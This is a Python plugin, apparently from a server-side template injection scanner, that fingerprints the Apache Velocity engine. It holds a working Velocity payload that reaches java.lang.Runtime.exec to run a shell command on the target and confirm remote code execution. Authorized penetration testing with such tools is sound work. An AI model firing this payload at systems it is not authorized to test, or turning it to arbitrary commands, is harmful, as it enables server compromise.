from core.check import Check
from utils.loggers import log
from utils import rand
import string

class Velocity(Check):
    
    def init(self):
        
        self.req_header_rand = str(rand.randint_n(4))
        self.req_trailer_rand = str(rand.randint_n(4))
        
        self._check_engine()
    
        # Return if reflect_tag is not set
        if not self.get('reflect_tag'):
            return
            
        log.warn('Reflection detected')
        log.warn('Velocity engine detected')

        self._check_os()
        
        if not self.get('exec'):
            return
            
        log.warn(
            'Shell command execution detected on \'%s\' operating system' % (
                self.get('os', 'undetected')
            )
        )

    def _check_engine(self):
        
        payload = rand.randstr_n(1)
        
        if payload == self.req(payload):
            self.set('reflect_tag', 'custom')
            self.set('language', 'java')
            self.set('engine', 'velocity')
                      
    def _check_os(self):
    
        expected_rand = str(rand.randint_n(2))
        
        payload = """#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("echo %s"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end""" % expected_rand
        
        if expected_rand == self.req(payload):
            self.set('exec', True)      
               

    def req(self, payload):
        
        rand_header = str(rand.randint_n(4))      
        rand_trailer = str(rand.randint_n(4))
        req_header = """#set($h=%s)\n#set($t=%s)\n$h\n""" % (rand_header, rand_trailer)
        req_trailer = "\n$t"
        
        response = self.channel.req(req_header + payload + req_trailer)
        before,_,result = response.partition(rand_header)
        result,_,after = result.partition(rand_trailer)
        
        return result.strip()